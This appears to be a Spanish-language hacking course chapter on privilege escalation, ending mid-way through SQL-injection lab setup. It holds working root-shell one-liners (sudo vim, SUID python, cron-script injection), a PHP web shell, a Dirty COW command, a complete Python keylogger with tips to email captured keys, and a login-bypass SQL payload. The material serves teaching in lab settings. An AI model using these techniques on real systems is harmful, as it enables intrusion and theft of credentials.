| **Inicio**         | **atrás 17**                             | **Siguiente 19**                                     |
| ------------------ | ---------------------------------------- | ---------------------------------------------------- |
| [🏠](../README.md) | [⏪](./7_17_Hacking_Servicios_de_Red.md) | [⏩](./7_19_Hacking_Aplicaciones_Web_Server_Side.md) |

---

## **Índice**

| Temario                                                                                                                                             |
| --------------------------------------------------------------------------------------------------------------------------------------------------- |
| [979. Comienza a escalar privilegios en Linux, Windows y aplicaciones web](#979-comienza-a-escalar-privilegios-en-linux-windows-y-aplicaciones-web) |
| [980. Qué es la escalada de privilegios](#980-qué-es-la-escalada-de-privilegios)                                                                    |
| [981. Estrategias de escalada de privilegios](#981-estrategias-de-escalada-de-privilegios)                                                          |
| [982. Creación y delegación de privilegios en sistemas operativos](#982-creación-y-delegación-de-privilegios-en-sistemas-operativos)                |
| [983. Escalada de privilegios en dispositivos móviles](#983-escalada-de-privilegios-en-dispositivos-móviles)                                        |
| [984. Keylogging](#984-keylogging)                                                                                                                  |
| [985. SQL Injection para Login Bypass](#985-sql-injection-para-login-bypass)                                                                        |
| [986. Password Cracking](#986-password-cracking)                                                                                                    |
| [987. Broken Access Control](#987-broken-access-control)                                                                                            |
| [988. Password Guessing](#988-password-guessing)                                                                                                    |
| [989. Ingeniería social](#989-ingeniería-social)                                                                                                    |
| [990. Sudo Security Bypass](#990-sudo-security-bypass)                                                                                              |
| [991. Linpeas](#991-linpeas)                                                                                                                        |
| [992. Cracking de llaves SSH privadas con John the Ripper](#992-cracking-de-llaves-ssh-privadas-con-john-the-ripper)                                |
| [993. Escalada de Privilegios con Binarios](#993-escalada-de-privilegios-con-binarios)                                                              |
| [994. Winpeas](#994-winpeas)                                                                                                                        |

# **Hacking: Escalada de Privilegios**

## **979. Comienza a escalar privilegios en Linux, Windows y aplicaciones web**

### 🧠 ¿Qué es la escalada de privilegios?

Es el proceso mediante el cual un atacante, que ya tiene acceso limitado a un sistema (como un usuario sin privilegios), **intenta obtener más permisos**, hasta convertirse en un **usuario privilegiado** como `root` (Linux) o `Administrador` (Windows).

---

### 🔧 Herramientas necesarias (Linux y Windows)

Para realizar escalada de privilegios necesitas **herramientas de enumeración** que te ayuden a encontrar debilidades. Aquí van algunas comunes:

#### 🐧 En Linux:

| Herramienta                | Instalación                                                                                                 | Uso principal                                 |
| -------------------------- | ----------------------------------------------------------------------------------------------------------- | --------------------------------------------- |
| `linpeas.sh`               | `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh`<br>`chmod +x linpeas.sh` | Enumeración de privilegios                    |
| `pspy`                     | `wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64`                               | Ver procesos en segundo plano sin root        |
| `sudo -l` (comando nativo) | Ya instalado                                                                                                | Lista qué comandos puedes ejecutar con `sudo` |
| `find` (comando nativo)    | Ya instalado                                                                                                | Buscar archivos con permisos mal configurados |

#### 🪟 En Windows:

| Herramienta     | Instalación                                                                                                        | Uso                                      |
| --------------- | ------------------------------------------------------------------------------------------------------------------ | ---------------------------------------- |
| `winPEAS.exe`   | Desde GitHub: [https://github.com/carlospolop/PEASS-ng/releases](https://github.com/carlospolop/PEASS-ng/releases) | Enumeración de privilegios               |
| `PowerUp.ps1`   | Desde PowerSploit o GitHub                                                                                         | Enumeración y explotación con PowerShell |
| `whoami /priv`  | Ya viene incluido                                                                                                  | Ver privilegios actuales                 |
| `accesschk.exe` | Desde Sysinternals                                                                                                 | Ver accesos de archivos o servicios      |

---

### 🔓 Escalada de privilegios en Linux

#### 🔍 Técnicas comunes:

1. **Sudo sin contraseña**

   ```bash
   sudo -l
   ```

   Si ves algo como:

   ```
   (ALL) NOPASSWD: /bin/bash
   ```

   Puedes hacer:

   ```bash
   sudo /bin/bash
   ```

2. **Binarios SUID vulnerables**

   Ver archivos con el bit SUID:

   ```bash
   find / -perm -4000 -type f 2>/dev/null
   ```

   Si encuentras un binario como `/usr/bin/python`, podrías hacer:

   ```bash
   /usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
   ```

3. **Créditos en cronjobs y permisos débiles**

   Usa `pspy` para monitorear tareas programadas mal configuradas.

---

### 🔓 Escalada de privilegios en Windows

#### 🔍 Técnicas comunes:

1. **Abusar de servicios con permisos de escritura**

   Usa `accesschk.exe` para ver si puedes modificar el binario de un servicio:

   ```cmd
   accesschk.exe -uwcqv "usuario" "C:\ruta\al\servicio.exe"
   ```

2. **Auto-elevación de servicios mal configurados**

   Si encuentras un servicio que corre como `SYSTEM` pero tú puedes editar el ejecutable o su ruta, puedes reemplazarlo por una shell inversa.

3. **Escalada con DLL hijacking**

   Si una aplicación busca una DLL que no existe en su ruta, puedes colocar una DLL maliciosa.

---

### 🌐 Escalada de privilegios en aplicaciones web

#### 🔍 Técnicas comunes:

1. **Malos controles de acceso**

   Por ejemplo, un usuario básico puede acceder a:

   ```
   /admin/panel
   ```

   aunque no debería.

2. **JWT mal configurados**

   Si puedes editar el token JWT sin ser detectado (por ejemplo, usando `none` como algoritmo o sin firmar correctamente).

3. **Subida de archivos (file upload)**

   Si puedes subir un archivo `.php` y ejecutarlo:

   ```php
   <?php system($_GET['cmd']); ?>
   ```

---

### 💻 Ejemplo completo (máquina tipo TryHackMe o Hack The Box)

#### Contexto:

- Te conectas a una máquina vulnerable con una shell de usuario `www-data`.
- Quieres escalar a `root`.

#### Paso 1: Reconocimiento

```bash
whoami
=> www-data

hostname
=> webserver-01
```

#### Paso 2: Enumeración con linpeas

```bash
wget http://tuIP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Resultado:

```bash
User www-data may run the following commands on this host:
    (ALL) NOPASSWD: /usr/bin/vim
```

#### Paso 3: Escalada con `sudo` y vim

```bash
sudo vim -c ':!/bin/sh'
```

Boom 💥, ya tienes una shell como `root`.

Verificación:

```bash
whoami
=> root
```

---

### 📌 Consejos finales

- Siempre **enumera bien antes de atacar**.
- Usa herramientas automáticas (PEAS, PowerUp) pero también analiza manualmente.
- Piensa como un atacante pero actúa como un analista: documenta todo.
- Practica en entornos seguros como **TryHackMe**, **Hack The Box**, **VulnHub**.

---

[🔼](#índice)

---

## **980. Qué es la escalada de privilegios**

**Escalada de privilegios** es el proceso por el cual un atacante o auditor de seguridad que ya ha conseguido acceso a un sistema (como un usuario normal o limitado), **intenta ganar más privilegios** hasta llegar a ser un usuario con más poder, como `root` en Linux o `Administrador` en Windows.

---

### 🧠 ¿Por qué alguien querría escalar privilegios?

Porque muchas acciones críticas del sistema están restringidas solo a usuarios privilegiados:

- Leer archivos protegidos como contraseñas (`/etc/shadow`)
- Modificar configuraciones del sistema
- Instalar o eliminar software
- Ver o espiar actividades de otros usuarios
- Persistir en el sistema (crear puertas traseras)

---

### 📂 Tipos de escalada de privilegios

#### 1. **Escalada horizontal**

Accedes a recursos de **otros usuarios del mismo nivel**.

Ejemplo: eres `usuarioA`, pero logras ver la bandeja de entrada de `usuarioB`.

#### 2. **Escalada vertical**

Pasas de un **nivel bajo a uno más alto**, como de `usuario` a `root` o `Administrador`.

Ejemplo: accedes a un sistema web como usuario invitado y terminas controlando el panel de administrador.

---

### 🛠️ ¿Cómo instalo un entorno para practicar escalada de privilegios?

#### OPCIÓN 1: Usar una máquina virtual vulnerable (fácil)

Usa herramientas como:

##### 🔸 [**TryHackMe**](https://tryhackme.com/)

- Gratuito (en parte)
- Enfocado en aprender
- Máquinas listas para practicar escalada de privilegios

Instalación: nada que instalar, solo registrarte y usar la **VPN** que te dan.

---

#### OPCIÓN 2: Instalar una VM vulnerable localmente (como VulnHub)

1. **Descargar VirtualBox** o **VMware**
2. Descargar una máquina vulnerable, como [**Linux: VulnOS**](https://www.vulnhub.com/)
3. Ejecutar la máquina en VirtualBox
4. Desde tu Kali Linux (host o VM), escanear y conectarte

---

#### OPCIÓN 3: Crear tu propio entorno de prueba (avanzado)

1. Instala una máquina Linux (Ubuntu Server por ejemplo)
2. Crea un usuario sin privilegios
3. Configura malas prácticas a propósito (por ejemplo, `sudo` mal configurado)
4. Accede con ese usuario e intenta escalar privilegios

---

### ✅ Ejemplo fácil de entender de escalada de privilegios (Linux)

#### Supón lo siguiente:

- Ya entraste a una máquina vulnerable como el usuario limitado `gus`.
- Quieres llegar a ser `root`.

---

#### Paso 1: Ver quién eres y tus privilegios

```bash
whoami
# Resultado: gus

id
# Resultado: uid=1001(gus) gid=1001(gus) groups=1001(gus)
```

---

#### Paso 2: Ver qué puedes hacer con `sudo`

```bash
sudo -l
```

Resultado:

```
User gus may run the following commands on this host:
    (ALL) NOPASSWD: /bin/bash
```

Esto significa que **puedes ejecutar `/bin/bash` como root sin contraseña** 😱.

---

#### Paso 3: Escalar privilegios

```bash
sudo /bin/bash
```

¡Ya eres root! 🎉

Verificación:

```bash
whoami
# Resultado: root

id
# uid=0(root) gid=0(root) groups=0(root)
```

---

### Otro ejemplo sencillo: Script con permisos mal puestos

Supón que encuentras este script:

```bash
ls -l /usr/local/bin/backup.sh
# -rwxrwxrwx 1 root root 200 Jul 26 10:00 /usr/local/bin/backup.sh
```

Cualquiera puede modificarlo (`rwxrwxrwx`). Y si es ejecutado por `root` en una tarea automática (cronjob), podrías **inyectarle código malicioso**.

Modificas el script:

```bash
echo "/bin/bash" > /usr/local/bin/backup.sh
```

La próxima vez que se ejecute... tendrás una shell.

---

### 🎓 Conclusión resumida

| Concepto                 | Explicación simple                                                    |
| ------------------------ | --------------------------------------------------------------------- |
| ¿Qué es?                 | Obtener más privilegios de los que tienes.                            |
| ¿Para qué sirve?         | Acceder a datos sensibles, tomar control total.                       |
| ¿Dónde se aplica?        | Linux, Windows, sitios web, apps móviles.                             |
| ¿Cómo practicar?         | Con TryHackMe, HackTheBox o máquinas locales vulnerables.             |
| Ejemplo típico (sudo -l) | Si puedes usar un programa como `bash` sin contraseña → ya eres root. |

---

[🔼](#índice)

---

## **981. Estrategias de escalada de privilegios**

### 🔐 ¿Qué son las estrategias de escalada de privilegios?

Son **métodos o caminos que un atacante o pentester sigue para elevar sus privilegios** dentro de un sistema. Estas estrategias permiten pasar de un **usuario limitado (como `www-data` o `usuario invitado`)** a uno con **máxima autoridad** (como `root` en Linux o `NT AUTHORITY\SYSTEM` en Windows).

---

### 🎯 Clasificación de estrategias

| Estrategia                        | ¿Qué busca aprovechar?                              | Sistemas afectados |
| --------------------------------- | --------------------------------------------------- | ------------------ |
| Malas configuraciones de `sudo`   | Permisos inseguros otorgados a usuarios             | Linux              |
| SUID mal configurado              | Programas ejecutables como root                     | Linux              |
| Cron jobs inseguros               | Tareas programadas que ejecutan scripts editables   | Linux              |
| Servicios mal configurados        | Servicios que permiten editar ejecutables           | Windows            |
| Binarios vulnerables              | Programas con fallos de seguridad                   | Ambos              |
| Contraseñas guardadas o expuestas | Credenciales encontradas en archivos o procesos     | Ambos              |
| Token hijacking / impersonación   | Suplantación de usuarios con privilegios            | Windows            |
| Explotación de aplicaciones web   | Saltarse roles o ganar control vía vulnerabilidades | Web                |

---

### 🛠️ Herramientas necesarias para aplicar estas estrategias

#### En **Linux**:

| Herramienta  | Instalación                                                                                               | Uso principal                           |
| ------------ | --------------------------------------------------------------------------------------------------------- | --------------------------------------- |
| `linpeas.sh` | `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x linpeas.sh` | Enumeración completa del sistema        |
| `pspy`       | `wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 && chmod +x pspy64`          | Ver cron jobs y procesos en tiempo real |
| `find`       | Viene instalado                                                                                           | Buscar archivos SUID o accesibles       |

#### En **Windows**:

| Herramienta     | Instalación                      | Uso principal                      |
| --------------- | -------------------------------- | ---------------------------------- |
| `winPEAS.exe`   | Descargar desde GitHub           | Enumeración de privilegios         |
| `Seatbelt.exe`  | Desde GitHub o PowerShell Empire | Recolectar información del sistema |
| `Accesschk.exe` | De Sysinternals                  | Ver permisos sobre servicios       |

---

### 🔎 Explicación de estrategias con ejemplos

---

#### 1. 🧂 **Malas configuraciones de `sudo` (Linux)**

Si el usuario tiene permitido ejecutar comandos como `root` sin contraseña:

```bash
sudo -l
```

Salida:

```
(gus) NOPASSWD: /usr/bin/vim
```

Puedes ejecutar:

```bash
sudo vim -c ':!/bin/bash'
```

¡Y ya tienes shell root!

---

#### 2. 🧨 **Archivos SUID inseguros (Linux)**

SUID: Bit que permite que un binario se ejecute con los privilegios del propietario (por lo general, `root`).

```bash
find / -perm -4000 -type f 2>/dev/null
```

Ejemplo: Si encuentras `/usr/bin/python` con SUID, podrías hacer:

```bash
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

#### 3. ⏰ **Cron jobs mal configurados (Linux)**

Detecta cron jobs con `pspy64`:

```bash
./pspy64
```

Si ves que se ejecuta `/home/gus/backup.sh` cada minuto, y tú puedes editarlo:

```bash
echo "/bin/bash" > /home/gus/backup.sh
chmod +x /home/gus/backup.sh
```

Cuando se ejecute el cron job... ¡te da una shell como root!

---

#### 4. 🧾 **Servicios mal configurados (Windows)**

Instala y usa `AccessChk`:

```cmd
accesschk.exe -uwcqv "Everyone" "C:\Ruta\Servicio.exe"
```

Si puedes **escribir** sobre un servicio que corre como `SYSTEM`, lo reemplazas por una reverse shell.

---

#### 5. 🔐 **Contraseñas en archivos (ambos sistemas)**

Buscar archivos con claves:

```bash
grep -r "password" /home
```

También puedes ver procesos que incluyen contraseñas:

```bash
ps aux | grep pass
```

En Windows, puedes usar:

```powershell
Get-Content C:\Users\usuario\AppData\Roaming\config.txt
```

---

#### 6. 🎭 **Impersonación o token hijacking (Windows)**

- Usa `whoami /priv` para ver si tienes el privilegio `SeImpersonatePrivilege`
- Usa herramientas como `PrintSpoofer` o `Juicy Potato` para explotar esto y ganar SYSTEM

---

#### 7. 🕸️ **Aplicaciones web mal protegidas**

Acceder a un panel de administración sin estar autenticado, por ejemplo:

```bash
GET /admin HTTP/1.1
Host: vulnerable.site
```

O explotar un mal JWT que puedas modificar sin que se valide.

---

### 🧪 Ejemplo completo de estrategia de escalada (Linux con cron job vulnerable)

#### 🔸 Escenario

- Accediste como `usuario: gus`
- Usas `linpeas.sh` o `pspy64` y descubres que se ejecuta `/home/gus/backup.sh` cada minuto
- El script tiene permisos de escritura y se ejecuta como root

---

#### 🔹 Paso 1: Comprobar permisos

```bash
ls -l /home/gus/backup.sh
# -rwxrwxrwx 1 root root 64 Jul 26 10:00 backup.sh
```

---

#### 🔹 Paso 2: Inyectar código

```bash
echo '#!/bin/bash' > /home/gus/backup.sh
echo '/bin/bash' >> /home/gus/backup.sh
chmod +x /home/gus/backup.sh
```

---

#### 🔹 Paso 3: Esperar la ejecución automática

Cuando se ejecute el cronjob, tendrás acceso como `root`:

```bash
whoami
# root
```

¡Privilegios escalados exitosamente! ✅

---

### 🧠 Conclusión

| Estrategia                                             | Clave de éxito               |
| ------------------------------------------------------ | ---------------------------- |
| Analiza siempre con herramientas                       | PEAS, pspy, AccessChk        |
| Revisa permisos, cronjobs, servicios                   | Ahí se esconden las joyas    |
| Busca contraseñas y backups                            | Muchas veces son descuidados |
| Usa exploits solo cuando no hay configuración insegura | Porque dejan más rastros     |

---

[🔼](#índice)

---

## **982. Creación y delegación de privilegios en sistemas operativos**

### 🔐 ¿Qué es la creación y delegación de privilegios?

#### ✅ **Creación de privilegios:**

Es el proceso mediante el cual un **administrador del sistema define roles, grupos o permisos especiales** que otorgan acceso a determinadas funciones del sistema operativo.

#### ✅ **Delegación de privilegios:**

Es cuando el administrador **cede ciertos permisos a usuarios o grupos**, sin dar acceso completo al sistema.

🔸 **Ejemplo real:** Permitir que un usuario pueda reiniciar el servidor, pero **no pueda instalar software ni ver archivos del administrador**.

---

#### 📂 ¿Por qué se hace esto?

- Para **delegar tareas sin comprometer la seguridad**
- Para que los usuarios puedan realizar su trabajo (por ejemplo, programadores que necesitan reiniciar servicios)
- Para aplicar el **principio de menor privilegio** (los usuarios solo deben tener los permisos mínimos necesarios)

---

### 🐧 En Linux: Creación y delegación de privilegios

---

#### 1. 👤 Crear usuarios y grupos

```bash
sudo adduser juan
sudo groupadd desarrolladores
sudo usermod -aG desarrolladores juan
```

Esto crea al usuario `juan` y lo añade al grupo `desarrolladores`.

---

#### 2. 🛡️ Usar `sudo` para delegar permisos

##### 🔹 ¿Qué es `sudo`?

Permite ejecutar comandos como otro usuario, típicamente como `root`.

##### 🔹 Configuración:

Edita el archivo `/etc/sudoers` (usa `visudo`, ¡nunca lo edites directamente!):

```bash
sudo visudo
```

Agrega esta línea:

```bash
juan ALL=(ALL) NOPASSWD: /bin/systemctl restart apache2
```

👉 Esto permite que **Juan pueda reiniciar el servicio de Apache sin necesidad de la contraseña root**, pero no puede hacer otras cosas como borrar archivos del sistema.

---

#### 3. 🧪 Prueba

Ahora, inicia sesión como Juan y ejecuta:

```bash
sudo /bin/systemctl restart apache2
```

¡Listo! Solo tiene ese poder, **nada más**.

---

#### 4. 📁 Delegación de acceso a archivos (con `setfacl`)

Supón que Juan necesita leer un archivo de logs:

```bash
sudo setfacl -m u:juan:r /var/log/secure
```

✅ Ahora Juan puede **leer ese archivo**, sin necesidad de hacerlo root.

---

### 🪟 En Windows: Creación y delegación de privilegios

---

#### 1. 👤 Crear usuario y grupo

Desde PowerShell:

```powershell
New-LocalUser -Name "juan" -NoPassword
Add-LocalGroupMember -Group "Users" -Member "juan"
```

---

#### 2. 🛡️ Delegar permisos con `secpol.msc`

Abre:

```cmd
secpol.msc
```

1. Ve a **Políticas locales → Asignación de derechos de usuario**
2. Por ejemplo: **"Apagar el sistema"**
3. Agrega el usuario `juan`

✅ Ahora puede apagar el sistema, pero no tiene acceso de Administrador.

---

#### 3. 🔐 Delegar acceso en carpetas específicas

Haz clic derecho en una carpeta → **Propiedades** → **Seguridad** → **Editar**

- Agrega a `juan`
- Marca solo "Leer" o "Ejecutar" (según lo que necesite)

---

#### 4. 🧪 Uso del comando `runas`

Juan puede ejecutar una app con privilegios usando:

```cmd
runas /user:Administrador cmd.exe
```

(Pedirá la contraseña del admin)

---

### 🧪 Ejemplo completo (Linux)

#### Escenario:

Quieres que el usuario `david` **pueda reiniciar un servicio** (como `nginx`), **leer un archivo protegido**, pero no pueda usar ningún otro comando privilegiado.

---

#### 🔹 Paso 1: Crear el usuario

```bash
sudo adduser david
```

---

#### 🔹 Paso 2: Permitir reinicio de `nginx` sin contraseña

```bash
sudo visudo
```

Agrega:

```bash
david ALL=(ALL) NOPASSWD: /bin/systemctl restart nginx
```

---

#### 🔹 Paso 3: Permitir acceso de lectura al log

```bash
sudo setfacl -m u:david:r /var/log/nginx/error.log
```

---

#### 🔹 Paso 4: Probar

Inicia sesión como `david`:

```bash
sudo /bin/systemctl restart nginx
cat /var/log/nginx/error.log
```

✅ Ambos comandos funcionan. Pero si intenta:

```bash
sudo apt update
```

❌ Se le negará el acceso, porque no tiene ese permiso en el `sudoers`.

---

### 📘 Conclusión

| Acción                     | Comando / Ruta clave                                      |
| -------------------------- | --------------------------------------------------------- |
| Crear usuarios             | `adduser`, `New-LocalUser`                                |
| Crear grupos               | `groupadd`, `net localgroup`                              |
| Delegar en Linux           | `visudo`, `setfacl`                                       |
| Delegar en Windows         | `secpol.msc`, permisos NTFS                               |
| Limitar lo que puede hacer | Delegar solo lo necesario (principio de menor privilegio) |

---

[🔼](#índice)

---

## **983. Escalada de privilegios en dispositivos móviles**

### 📱 ¿Qué es la escalada de privilegios en dispositivos móviles?

La **escalada de privilegios en móviles** es cuando un atacante, app maliciosa o auditor de seguridad **obtiene más permisos de los que debería** en un dispositivo móvil, con el fin de acceder a funciones o datos restringidos.

---

#### 📊 ¿Por qué es importante?

- Puede permitir leer mensajes privados, ubicación, historial de llamadas.
- Puede ayudar a persistir malware.
- Puede romper el modelo de seguridad del sistema operativo móvil.

---

### 📱 Sistemas afectados

| Sistema     | ¿Es vulnerable? | Formas comunes de escalada                        |
| ----------- | --------------- | ------------------------------------------------- |
| **Android** | ✅ Sí           | Rooting, explotación de fallas en apps o firmware |
| **iOS**     | ✅ Sí           | Jailbreaking, vulnerabilidades en iOS o apps      |

---

### 🧠 Tipos de escalada de privilegios en móviles

| Tipo            | Explicación sencilla                                    |
| --------------- | ------------------------------------------------------- |
| **Vertical**    | Pasar de un usuario normal a acceso `root` o `system`   |
| **Horizontal**  | Una app o usuario accede a datos de otra app o usuario  |
| **Local (LPE)** | Explota vulnerabilidad local (como en Android 4.x, 5.x) |
| **Remota**      | Desde una app o conexión remota (menos común)           |

---

### 🧰 Herramientas necesarias (para pruebas éticas)

#### Para Android:

| Herramienta                    | Función principal             | Instalación                                           |
| ------------------------------ | ----------------------------- | ----------------------------------------------------- |
| **Android Studio**             | Simulador de Android          | [Sitio oficial](https://developer.android.com/studio) |
| **adb (Android Debug Bridge)** | Conectar y ejecutar comandos  | Incluido con Android Studio                           |
| **Frida**                      | Instrumentación y hooking     | `pip install frida-tools`                             |
| **Magisk**                     | Root moderno para Android     | En dispositivos reales                                |
| **Metasploit**                 | Explotación de fallas Android | En Kali Linux: `msfconsole`                           |

---

#### Para iOS (más restringido):

- Se requiere **dispositivo físico**
- **Jailbreak** con herramientas como **Checkra1n**, **Unc0ver**
- Herramientas como `frida`, `Objection`, y `Cycript`

⚠️ **Apple bloquea muchas herramientas en simuladores**, por lo que se usa más en dispositivos físicos.

---

### 🔧 ¿Cómo se instala un entorno para practicar?

#### ✅ Opción: Emulador Android + ADB (seguro y gratuito)

1. Instala **Android Studio**
2. Crea un **emulador virtual (AVD)** con Android 7, 8 o 9
3. Abre una terminal con `adb shell`

✅ Ya tienes acceso como usuario `shell` en el emulador, y puedes simular ataques locales de escalada.

---

### 🧪 Ejemplo de escalada de privilegios (Android)

---

#### 🔸 Escenario:

Estás haciendo pruebas en un **emulador Android** o dispositivo rooteado, y encuentras que una aplicación tiene archivos sensibles protegidos, pero hay un fallo en los permisos de sistema.

---

#### 🔹 Paso 1: Ver el usuario actual

Abre terminal o usa:

```bash
adb shell
whoami
# Resultado: shell
```

No tienes privilegios root aún.

---

#### 🔹 Paso 2: Buscar archivos sensibles

Busca archivos con permisos inseguros:

```bash
find /data -type f -perm 0777 2>/dev/null
```

Supón que aparece:

```bash
/data/data/com.vulnerable.app/database.db
```

Y tú puedes leerlo sin ser root.

---

#### 🔹 Paso 3: Obtener acceso root (en entorno de pruebas)

Si estás en un emulador con acceso root o un teléfono con **Magisk**, haz:

```bash
adb root
adb shell
whoami
# Resultado: root
```

Ahora puedes ver **todas las apps, logs del sistema, archivos de otras apps**, etc.

---

#### 🔹 Paso 4: Escalada de privilegios local (teórico)

Algunas vulnerabilidades permiten escalar de `shell` a `root` sin autorización, como:

- **Dirty Cow (CVE-2016-5195)**
- **Ashmem race (CVE-2019-2215)**

Estas se explotan desde una app o código cargado y ejecutado desde el móvil.

Un ataque con Dirty Cow sería:

```bash
./dirtycow /system/bin/run-as my_suid_shell
```

Donde creas un binario `run-as` que te da root.

(Esto ya no funciona en versiones nuevas, pero se usa en laboratorios educativos)

---

### 🍏 ¿Y en iOS?

#### iOS tiene protecciones muy fuertes:

- Apps se ejecutan en **sandbox**
- Solo se puede escalar privilegios si el sistema fue **jailbreakeado**
- Herramientas: `checkra1n`, `unc0ver`, `Frida`, `Objection`

Ejemplo:

- Tras un jailbreak, puedes usar:

```bash
frida -U -n AppName
```

Y manipular funciones internas que antes eran inaccesibles.

---

### ✅ Ejemplo completo resumido (Android en emulador)

#### Escenario:

Tienes un emulador Android con una app vulnerable. Quieres acceder a archivos de sistema protegidos.

---

#### 🔹 1. Crear y abrir el emulador

Con Android Studio → AVD Manager → Inicia un dispositivo con Android 8

---

#### 🔹 2. Entrar por ADB

```bash
adb shell
whoami
# shell
```

---

#### 🔹 3. Obtener root

```bash
adb root
adb shell
whoami
# root
```

---

#### 🔹 4. Ver carpetas protegidas

```bash
ls /data/data
# Lista apps instaladas

cat /data/data/com.app.secret/secret.txt
# Puedes leer datos privados de la app
```

---

### 🧠 Conclusión

| Tema                       | Clave                                        |
| -------------------------- | -------------------------------------------- |
| Escalada en Android        | Más viable con emulador o root               |
| Escalada en iOS            | Requiere jailbreak                           |
| Entorno de práctica seguro | Emulador Android + ADB                       |
| Herramientas útiles        | Frida, ADB, Magisk, Metasploit               |
| Ejemplo                    | Usar `adb root` para acceder a datos de apps |

---

[🔼](#índice)

---

## **984. Keylogging**

### 🔐 ¿Qué es un keylogger?

**Un keylogger (o registrador de teclas)** es un programa que **graba todo lo que un usuario escribe en el teclado**, sin que se dé cuenta.

---

### 📚 ¿Para qué se usa?

#### Legal y educativo:

- Pruebas de seguridad (pentesting)
- Control parental
- Recuperar texto perdido

#### Ilegal (⚠️ prohibido sin consentimiento):

- Robo de contraseñas
- Espionaje
- Robo de información personal

✅ **IMPORTANTE:** Usarlo sin consentimiento es **ilegal**. Solo debe usarse en **laboratorios controlados** o **con autorización**.

---

### 🧠 Tipos de keyloggers

| Tipo                 | Descripción breve                                  |
| -------------------- | -------------------------------------------------- |
| **Software**         | Programas que graban lo que escribes               |
| **Hardware**         | Dispositivos físicos que se conectan al teclado    |
| **Kernel-level**     | Capturan directamente desde el sistema operativo   |
| **Hook-based (API)** | Usan funciones del sistema para interceptar teclas |

---

### 💻 ¿Cómo se instala un entorno para practicar keylogging?

#### ✅ Opción 1: Entorno local con Python (recomendado para aprender)

##### Requisitos:

- Tener Python 3 instalado
- Instalar una librería para capturar eventos del teclado: `pynput`

---

##### 🔧 Instalación (Windows, Linux o Mac)

1. Instalar Python:
   Descárgalo desde [https://www.python.org](https://www.python.org)

2. Instalar la librería `pynput`:

```bash
pip install pynput
```

¡Y ya estás listo para crear un keylogger básico!

---

#### 🧪 Ejemplo completo de keylogger en Python (educativo)

Este keylogger:

- Captura las teclas que presionas
- Las guarda en un archivo `.txt`

---

#### 🧾 Código paso a paso

```python
from pynput import keyboard

# Archivo donde se guardarán las teclas
archivo = "registro_teclas.txt"

def presionar_tecla(tecla):
    try:
        with open(archivo, "a") as f:
            f.write(f"{tecla.char}")
    except AttributeError:
        # Si la tecla es especial (como Enter, Shift, etc.)
        with open(archivo, "a") as f:
            f.write(f" [{tecla}] ")

# Iniciar escucha del teclado
with keyboard.Listener(on_press=presionar_tecla) as listener:
    listener.join()
```

---

#### 📌 Cómo ejecutarlo

1. Guarda el código como `keylogger.py`
2. Ejecuta el script:

```bash
python keylogger.py
```

3. Abre un bloc de notas o cualquier ventana y comienza a escribir
4. Verifica el archivo `registro_teclas.txt`

---

#### 🧹 Cómo detenerlo

Presiona `Ctrl + C` en la terminal donde lo ejecutaste.

---

#### 🛑 Seguridad y ética

- **Nunca distribuyas este tipo de scripts**
- **No lo uses en computadoras ajenas o públicas**
- **Siempre informa a los usuarios si se va a monitorear el equipo**

---

### 🧠 Explicación paso a paso del script

| Línea                         | ¿Qué hace?                                                |
| ----------------------------- | --------------------------------------------------------- |
| `from pynput import keyboard` | Importa la librería para escuchar el teclado              |
| `def presionar_tecla(tecla)`  | Función que se ejecuta cada vez que se presiona una tecla |
| `with open(archivo, "a")`     | Guarda las teclas en un archivo                           |
| `listener.join()`             | Mantiene el programa escuchando                           |

---

### 🧰 ¿Qué más se puede hacer?

- Enviar los datos por correo automáticamente
- Capturar pantalla junto con las teclas
- Esconder la ventana (con cuidado y solo en pruebas)

---

### 📘 Conclusión

| Concepto              | Detalles                                                         |
| --------------------- | ---------------------------------------------------------------- |
| ¿Qué es un keylogger? | Programa que graba lo que escribes                               |
| ¿Cómo se instala?     | Python + `pynput`                                                |
| ¿Es legal?            | Solo si tienes permiso o es con fines educativos                 |
| ¿Cómo protegerte?     | Usa antivirus, evita instalar software desconocido               |
| Ejemplo dado          | Código simple que guarda las teclas en un archivo de texto plano |

---

[🔼](#índice)

---

## **985. SQL Injection para Login Bypass**

### 🧨 ¿Qué es SQL Injection?

**SQL Injection (Inyección SQL)** es una técnica de ataque que consiste en **insertar código SQL malicioso** en campos de entrada (como formularios), con el fin de:

- Acceder a datos restringidos
- Manipular la base de datos
- Omitir controles de seguridad (como el inicio de sesión)

---

### 🔑 ¿Qué es Login Bypass con SQL Injection?

Es cuando un atacante **puede acceder a un sistema sin conocer las credenciales reales**, gracias a una vulnerabilidad en el formulario de inicio de sesión que **no filtra correctamente las entradas del usuario**.

---

#### 📌 Ejemplo conceptual

Supón que tienes este formulario:

| Usuario | Contraseña |
| ------- | ---------- |
| `admin` | `admin123` |

Pero alguien escribe lo siguiente en el campo de usuario:

```sql
' OR '1'='1
```

Y cualquier cosa (o nada) en contraseña.

---

### 📜 ¿Qué pasa en el backend?

El código vulnerable podría lucir así:

```sql
SELECT * FROM usuarios WHERE usuario = 'input_usuario' AND contrasena = 'input_contrasena';
```

Con la entrada maliciosa, se transforma en:

```sql
SELECT * FROM usuarios WHERE usuario = '' OR '1'='1' AND contrasena = '';
```

Y como `'1'='1'` siempre es **verdadero**, el sistema permite el acceso sin validar credenciales. 🎯

---

### ⚙️ ¿Cómo se instala un entorno para practicar? (100% seguro)

#### ✅ Opción: Usar DVWA (Damn Vulnerable Web Application)

> DVWA es una app vulnerable creada para aprender ciberseguridad de forma ética.

---

#### 🔧 Requisitos:

- **Sistema operativo**: Kali Linux, Ubuntu, WSL o VM
- **Servidor web + PHP + MySQL**

---

#### 🧪 Instalación rápida en Kali Linux:

##### 1. Instala Apache, PHP y MySQL:

```bash
sudo apt update
sudo apt install apache2 php php-mysqli mariadb-server git unzip -y
```

##### 2. Clona DVWA:

```bash
cd /var/www/html
sudo git clone https://github.com/digininja/DVWA.git
sudo chown -R www-data:www-data DVWA
```

##### 3. Configura la base de datos:

```bash
sudo service mysql start
sudo mysql -u root
```

Dentro de MySQL:

```sql
CREATE DATABASE dvwa;
